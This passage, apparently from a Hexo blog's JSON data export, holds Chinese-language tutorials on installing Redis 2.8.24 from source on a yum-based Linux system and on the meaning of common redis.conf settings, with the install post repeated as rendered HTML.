安装\n\n检查安装依赖程序\n```bash\nyum install gcc-c++\nyum install -y tcl\nyum install wget\n```\n\n获取安装文件\n```bash\nwget http://download.redis.io/releases/redis-2.8.24.tar.gz\n```\n\n解压文件\n```bash\ntar -xzvf redis-2.8.24.tar.gz\nmv redis-2.8.24 redis\ncd redis\n```\n\n<!-- more -->\n\n安装及版本查看\n```bash\n#编译安装\nmake\nmake install\n\n#版本查看\nredis-server --version\n```\n\n设置配置文件路径\n```bash\nmkdir -p /etc/redis\ncp redis.conf /etc/redis\n```\n\n修改配置文件\n```bash\nvim /etc/redis/redis.conf\n\n#仅修改daemonize，no设置为yes，按守护进程启动\n#密码设置、多实例、主从搭建可以查看本站另一篇文章\ndaemonize yes\n```\n\n启动\n```bash\n/usr/local/bin/redis-server /etc/redis/redis.conf\nps -ef | grep redis\n```\n\n使用客户端\n```bash\nredis-cli\n>set name david\nOK\n>get name\n\"david\"\n```\n\nPS：如果要卸载redis，把/usr/local/bin/目录下的redis删除即可。\n为了卸载干净，你还可以把解压和编译的redis包及配置的redis.conf也删除。\n\n---\n\n### 开机自启动\n```bash\necho \"/usr/local/bin/redis-server /etc/redis/redis.conf &\" >> /etc/rc.local\n```\n---\n\n### 相关链接\nredis中文官网：\nhttp://doc.redisfans.com/\n\nreids设计与实现\nhttp://redisbook.readthedocs.org/en/latest/index.html\n\nredis使用场景\nhttp://www.360doc.com/content/15/0510/20/23016082_469494498.shtml\n\nredis conf配置详解\nhttp://www.cnblogs.com/kreo/p/4423362.html","slug":"Redis安装","published":1,"updated":"2016-11-20T03:12:54.102Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulc50028gwtmjf51orgm","content":"<h3 id=\"redis&#x7B80;&#x4ECB;\"><a href=\"#redis&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"redis&#x7B80;&#x4ECB;\"></a>redis&#x7B80;&#x4ECB;</h3><p>redis&#x662F;&#x4E00;&#x4E2A;&#x6027;&#x80FD;&#x975E;&#x5E38;&#x4F18;&#x79C0;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;key-value&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3002;&#x548C;Memcached&#x7C7B;&#x4F3C;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;value&#x7C7B;&#x578B;&#x76F8;&#x5BF9;&#x66F4;&#x591A;&#xFF0C;&#x5305;&#x62EC;string(&#x5B57;&#x7B26;&#x4E32;)&#x3001;list(&#x94FE;&#x8868;)&#x3001;set(&#x96C6;&#x5408;)&#x3001;zset(sorted set &#x2013;&#x6709;&#x5E8F;&#x96C6;&#x5408;)&#x548C;hashs&#xFF08;&#x54C8;&#x5E0C;&#x7C7B;&#x578B;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x90FD;&#x652F;&#x6301;push/pop&#x3001;add/remove&#x53CA;&#x53D6;&#x4EA4;&#x96C6;&#x5E76;&#x96C6;&#x548C;&#x5DEE;&#x96C6;&#x53CA;&#x66F4;&#x4E30;&#x5BCC;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;redis&#x652F;&#x6301;&#x5404;&#x79CD;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x7684;&#x6392;&#x5E8F;&#x3002;&#x4E0E;memcached&#x4E00;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6548;&#x7387;&#xFF0C;&#x6570;&#x636E;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x533A;&#x522B;&#x7684;&#x662F;redis&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x628A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x6216;&#x8005;&#x628A;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x5199;&#x5165;&#x8FFD;&#x52A0;&#x7684;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x5B9E;&#x73B0;&#x4E86;master-slave(&#x4E3B;&#x4ECE;)&#x540C;&#x6B65;&#x3002;</p>\n<p>Redis &#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x6027;&#x80FD;&#x7684;key-value&#x6570;&#x636E;&#x5E93;&#x3002; redis&#x7684;&#x51FA;&#x73B0;&#xFF0C;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x8865;&#x507F;&#x4E86;memcached&#x8FD9;&#x7C7B;key/value&#x5B58;&#x50A8;&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x5728;&#x90E8; &#x5206;&#x573A;&#x5408;&#x53EF;&#x4EE5;&#x5BF9;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x8D77;&#x5230;&#x5F88;&#x597D;&#x7684;&#x8865;&#x5145;&#x4F5C;&#x7528;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;Python&#xFF0C;Ruby&#xFF0C;Erlang&#xFF0C;PHP&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F7F;&#x7528;&#x5F88;&#x65B9;&#x4FBF;&#x3002;redis&#x7684;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x8BE6;&#x89C1;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#x3002;</p>\n<h3 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h3><p>&#x68C0;&#x67E5;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x7A0B;&#x5E8F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install gcc-c++</span><br><span class=\"line\">yum install -y tcl</span><br><span class=\"line\">yum install wget</span><br></pre></td></tr></table></figure></p>\n<p>&#x83B7;&#x53D6;&#x5B89;&#x88C5;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/releases/redis-2.8.24.tar.gz</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x538B;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xzvf redis-2.8.24.tar.gz</span><br><span class=\"line\">mv redis-2.8.24 redis</span><br><span class=\"line\"><span class=\"built_in\">cd</span> redis</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>&#x5B89;&#x88C5;&#x53CA;&#x7248;&#x672C;&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</span></span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x7248;&#x672C;&#x67E5;&#x770B;</span></span><br><span class=\"line\">redis-server --version</span><br></pre></td></tr></table></figure></p>\n<p>&#x8BBE;&#x7F6E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -p /etc/redis</span><br><span class=\"line\">cp redis.conf /etc/redis</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4EC5;&#x4FEE;&#x6539;daemonize&#xFF0C;no&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x6309;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x3001;&#x591A;&#x5B9E;&#x4F8B;&#x3001;&#x4E3B;&#x4ECE;&#x642D;&#x5EFA;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;</span></span><br><span class=\"line\">daemonize yes</span><br></pre></td></tr></table></figure></p>\n<p>&#x542F;&#x52A8;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/<span class=\"built_in\">local</span>/bin/redis-server /etc/redis/redis.conf</span><br><span class=\"line\">ps -ef | grep redis</span><br></pre></td></tr></table></figure></p>\n<p>&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">&gt;<span class=\"built_in\">set</span> name david</span><br><span class=\"line\">OK</span><br><span class=\"line\">&gt;get name</span><br><span class=\"line\"><span class=\"string\">&quot;david&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>PS&#xFF1A;&#x5982;&#x679C;&#x8981;&#x5378;&#x8F7D;redis&#xFF0C;&#x628A;/usr/local/bin/&#x76EE;&#x5F55;&#x4E0B;&#x7684;redis&#x5220;&#x9664;&#x5373;&#x53EF;&#x3002;<br>&#x4E3A;&#x4E86;&#x5378;&#x8F7D;&#x5E72;&#x51C0;&#xFF0C;&#x4F60;&#x8FD8;&#x53EF;&#x4EE5;&#x628A;&#x89E3;&#x538B;&#x548C;&#x7F16;&#x8BD1;&#x7684;redis&#x5305;&#x53CA;&#x914D;&#x7F6E;&#x7684;redis.conf&#x4E5F;&#x5220;&#x9664;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"><a href=\"#&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\" class=\"headerlink\" title=\"&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"></a>&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/usr/local/bin/redis-server /etc/redis/redis.conf &amp;&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>redis&#x4E2D;&#x6587;&#x5B98;&#x7F51;&#xFF1A;<br><a href=\"http://doc.redisfans.com/\" target=\"_blank\" rel=\"external\">http://doc.redisfans.com/</a></p>\n<p>reids&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;<br><a href=\"http://redisbook.readthedocs.org/en/latest/index.html\" target=\"_blank\" rel=\"external\">http://redisbook.readthedocs.org/en/latest/index.html</a></p>\n<p>redis&#x4F7F;&#x7528;&#x573A;&#x666F;<br><a href=\"http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml\" target=\"_blank\" rel=\"external\">http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml</a></p>\n<p>redis conf&#x914D;&#x7F6E;&#x8BE6;&#x89E3;<br><a href=\"http://www.cnblogs.com/kreo/p/4423362.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/kreo/p/4423362.html</a></p>\n","excerpt":"<h3 id=\"redis&#x7B80;&#x4ECB;\"><a href=\"#redis&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"redis&#x7B80;&#x4ECB;\"></a>redis&#x7B80;&#x4ECB;</h3><p>redis&#x662F;&#x4E00;&#x4E2A;&#x6027;&#x80FD;&#x975E;&#x5E38;&#x4F18;&#x79C0;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;key-value&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3002;&#x548C;Memcached&#x7C7B;&#x4F3C;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;value&#x7C7B;&#x578B;&#x76F8;&#x5BF9;&#x66F4;&#x591A;&#xFF0C;&#x5305;&#x62EC;string(&#x5B57;&#x7B26;&#x4E32;)&#x3001;list(&#x94FE;&#x8868;)&#x3001;set(&#x96C6;&#x5408;)&#x3001;zset(sorted set &#x2013;&#x6709;&#x5E8F;&#x96C6;&#x5408;)&#x548C;hashs&#xFF08;&#x54C8;&#x5E0C;&#x7C7B;&#x578B;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x90FD;&#x652F;&#x6301;push/pop&#x3001;add/remove&#x53CA;&#x53D6;&#x4EA4;&#x96C6;&#x5E76;&#x96C6;&#x548C;&#x5DEE;&#x96C6;&#x53CA;&#x66F4;&#x4E30;&#x5BCC;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;redis&#x652F;&#x6301;&#x5404;&#x79CD;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x7684;&#x6392;&#x5E8F;&#x3002;&#x4E0E;memcached&#x4E00;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6548;&#x7387;&#xFF0C;&#x6570;&#x636E;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x533A;&#x522B;&#x7684;&#x662F;redis&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x628A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x6216;&#x8005;&#x628A;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x5199;&#x5165;&#x8FFD;&#x52A0;&#x7684;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x5B9E;&#x73B0;&#x4E86;master-slave(&#x4E3B;&#x4ECE;)&#x540C;&#x6B65;&#x3002;</p>\n<p>Redis &#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x6027;&#x80FD;&#x7684;key-value&#x6570;&#x636E;&#x5E93;&#x3002; redis&#x7684;&#x51FA;&#x73B0;&#xFF0C;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x8865;&#x507F;&#x4E86;memcached&#x8FD9;&#x7C7B;key/value&#x5B58;&#x50A8;&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x5728;&#x90E8; &#x5206;&#x573A;&#x5408;&#x53EF;&#x4EE5;&#x5BF9;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x8D77;&#x5230;&#x5F88;&#x597D;&#x7684;&#x8865;&#x5145;&#x4F5C;&#x7528;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;Python&#xFF0C;Ruby&#xFF0C;Erlang&#xFF0C;PHP&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F7F;&#x7528;&#x5F88;&#x65B9;&#x4FBF;&#x3002;redis&#x7684;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x8BE6;&#x89C1;&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#x3002;</p>\n<h3 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h3><p>&#x68C0;&#x67E5;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x7A0B;&#x5E8F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install gcc-c++</span><br><span class=\"line\">yum install -y tcl</span><br><span class=\"line\">yum install wget</span><br></pre></td></tr></table></figure></p>\n<p>&#x83B7;&#x53D6;&#x5B89;&#x88C5;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/releases/redis-2.8.24.tar.gz</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x538B;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xzvf redis-2.8.24.tar.gz</span><br><span class=\"line\">mv redis-2.8.24 redis</span><br><span class=\"line\"><span class=\"built_in\">cd</span> redis</span><br></pre></td></tr></table></figure></p>","more":"<p>&#x5B89;&#x88C5;&#x53CA;&#x7248;&#x672C;&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</span></span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x7248;&#x672C;&#x67E5;&#x770B;</span></span><br><span class=\"line\">redis-server --version</span><br></pre></td></tr></table></figure></p>\n<p>&#x8BBE;&#x7F6E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -p /etc/redis</span><br><span class=\"line\">cp redis.conf /etc/redis</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4EC5;&#x4FEE;&#x6539;daemonize&#xFF0C;no&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x6309;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x3001;&#x591A;&#x5B9E;&#x4F8B;&#x3001;&#x4E3B;&#x4ECE;&#x642D;&#x5EFA;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;</span></span><br><span class=\"line\">daemonize yes</span><br></pre></td></tr></table></figure></p>\n<p>&#x542F;&#x52A8;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/<span class=\"built_in\">local</span>/bin/redis-server /etc/redis/redis.conf</span><br><span class=\"line\">ps -ef | grep redis</span><br></pre></td></tr></table></figure></p>\n<p>&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">&gt;<span class=\"built_in\">set</span> name david</span><br><span class=\"line\">OK</span><br><span class=\"line\">&gt;get name</span><br><span class=\"line\"><span class=\"string\">&quot;david&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>PS&#xFF1A;&#x5982;&#x679C;&#x8981;&#x5378;&#x8F7D;redis&#xFF0C;&#x628A;/usr/local/bin/&#x76EE;&#x5F55;&#x4E0B;&#x7684;redis&#x5220;&#x9664;&#x5373;&#x53EF;&#x3002;<br>&#x4E3A;&#x4E86;&#x5378;&#x8F7D;&#x5E72;&#x51C0;&#xFF0C;&#x4F60;&#x8FD8;&#x53EF;&#x4EE5;&#x628A;&#x89E3;&#x538B;&#x548C;&#x7F16;&#x8BD1;&#x7684;redis&#x5305;&#x53CA;&#x914D;&#x7F6E;&#x7684;redis.conf&#x4E5F;&#x5220;&#x9664;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"><a href=\"#&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\" class=\"headerlink\" title=\"&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"></a>&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/usr/local/bin/redis-server /etc/redis/redis.conf &amp;&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>redis&#x4E2D;&#x6587;&#x5B98;&#x7F51;&#xFF1A;<br><a href=\"http://doc.redisfans.com/\">http://doc.redisfans.com/</a></p>\n<p>reids&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;<br><a href=\"http://redisbook.readthedocs.org/en/latest/index.html\">http://redisbook.readthedocs.org/en/latest/index.html</a></p>\n<p>redis&#x4F7F;&#x7528;&#x573A;&#x666F;<br><a href=\"http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml\">http://www.360doc.com/content/15/0510/20/23016082_469494498.shtml</a></p>\n<p>redis conf&#x914D;&#x7F6E;&#x8BE6;&#x89E3;<br><a href=\"http://www.cnblogs.com/kreo/p/4423362.html\">http://www.cnblogs.com/kreo/p/4423362.html</a></p>"},{"title":"Redis配置文件详解","date":"2016-09-20T14:10:00.000Z","toc":false,"_content":"\n**REDIS 配置文件示例:**\n<!-- more -->\n\n```bash\n# redis 配置文件示例\n#\n# 当你需要为某个配置项指定内存大小的时候，必须要带上单位，\n# 通常的格式就是 1k 5gb 4m 等酱紫：\n#\n# 1k => 1000 bytes\n# 1kb => 1024 bytes\n# 1m => 1000000 bytes\n# 1mb => 1024*1024 bytes\n# 1g => 1000000000 bytes\n# 1gb => 1024*1024*1024 bytes\n#\n# 内存配置大小写是一样的.比如 1gb 1Gb 1GB 1gB\n\n################################ 常用 #####################################\n\n# daemonize no 默认情况下redis不是作为守护进程运行的\n# 如果你想让它在后台运行，你就把它改成 yes\ndaemonize yes\n\n# 当redis在后台运行的时候，默认会把pid文件放在/var/run/redis.pid，你可以配置到其他地址。\n# 当运行多个redis服务时，需要指定不同的pid文件和端口\npidfile /var/run/redis.pid\n\n# 指定redis运行的端口，默认是6379\nport 6379\n\n# TCP 监听的最大容纳数量\n#\n# 在高并发的环境下，你需要把这个值调高以避免客户端连接缓慢的问题。\n# Linux 内核会一声不响的把这个值缩小成 /proc/sys/net/core/somaxconn 对应的值，\n# 所以你要修改这两个值才能达到你的预期。\n# tcp-backlog 511\n\n# 默认情况下，redis 在 server 上所有有效的网络接口上监听客户端连接。\n# 你如果只想让它在一个网络接口上监听，那你就绑定一个IP或者多个IP。\n#\n# 示例，多个IP用空格隔开:\n#\n# bind 192.168.1.100 10.0.0.1\nbind 127.0.0.1\n\n# Specify the path for the unix socket that will be used to listen for\n# incoming connections. There is no default, so Redis will not listen\n# on a unix socket when not specified.\n# 指定 unix socket 的路径。\n#\n# unixsocket /tmp/redis.sock\n# unixsocketperm 755\n\n# 设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接\n# 0是关闭此设置\ntimeout 0\n\n# tcp 心跳包。\n#\n# 如果设置为非零，则在与客户端缺乏通讯的时候使用 SO_KEEPALIVE 发送 tcp acks 给客户端。\n# 这个之所有有用，主要由两个原因：\n#\n# 1) 防止死的 peers\n# 2) Take the connection alive from the point of view of network\n#    equipment in the middle.\n#\n# On Linux, the specified value (in seconds) is the period used to send ACKs.\n# Note that to close the connection the double of the time is needed.\n# On other kernels the period depends on the kernel configuration.\n#\n# A reasonable value for this option is 60 seconds.\n# 推荐一个合理的值就是60秒\ntcp-keepalive 0\n\n# 指定日志记录级别\n# Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose\n# debug 记录很多信息，用于开发和测试\n# varbose 有用的信息，不像debug会记录那么多\n# notice 普通的verbose，常用于生产环境\n# warning 只有非常重要或者严重的信息会记录到日志\nloglevel debug\n\n# 配置log文件地址，不同的redis实例设置不同的日志文件，便于问题定位\n# 默认值为stdout，标准输出，若后台模式会输出到/dev/null\n# logfile stdout\nlogfile /var/log/redis/redis.log\n\n# 要想把日志记录到系统日志，就把它改成 yes，\n# 也可以可选择性的更新其他的syslog 参数以达到你的要求\n# syslog-enabled no\n\n# 设置 syslog 的 identity。\n# syslog-ident redis\n \n# 设置 syslog 的 facility，必须是 USER 或者是 LOCAL0-LOCAL7 之间的值。\n# syslog-facility local0\n\n# 设置数据库的数目。\n# 默认数据库是 DB 0，你可以在每个连接上使用 select <dbid> 命令选择一个不同的数据库，\n# 但是 dbid 必须是一个介于 0 到 databasees - 1 之间的值\ndatabases 16\n\n################################ 快照 #################################\n\n#\n# 存 DB 到磁盘：\n#\n#   格式：save <间隔时间（秒）> <写入次数>\n#\n#   根据给定的时间间隔和写入次数将数据保存到磁盘\n#\n#   下面的例子的意思是：\n#   900 秒内如果至少有 1 个 key 的值变化，则保存\n#   300 秒内如果至少有 10 个 key 的值变化，则保存\n#   60 秒内如果至少有 10000 个 key 的值变化，则保存\n#　　\n#   注意：你可以注释掉所有的 save 行来停用保存功能。\n#   也可以直接一个空字符串来实现停用：\n#   save \"\"\n \nsave 900 1\nsave 300 10\nsave 60 10000\n\n# 默认情况下，如果 redis 最后一次的后台保存失败，redis 将停止接受写操作，\n# 这样以一种强硬的方式让用户知道数据不能正确的持久化到磁盘，\n# 否则就会没人注意到灾难的发生。\n#\n# 如果后台保存进程重新启动工作了，redis 也将自动的允许写操作。\n#\n# 然而你要是安装了靠谱的监控，你可能不希望 redis 这样做，那你就改成 no 好了。\nstop-writes-on-bgsave-error yes\n \n# 是否在 dump .rdb 数据库的时候使用 LZF 压缩字符串\n# 默认都设为 yes\n# 如果你希望保存子进程节省点 cpu ，你就设置它为 no ，\n# 不过这个数据集可能就会比较大\nrdbcompression yes\n\n# 是否校验rdb文件\nrdbchecksum yes\n\n# 本地持久化数据库文件名，默认值为dump.rdb\n# 不同的redis实例设置不同的db文件，便于问题定位\ndbfilename dump.rdb\n\n# 工作目录\n#\n# 数据库镜像备份的文件放置的路径。\n# 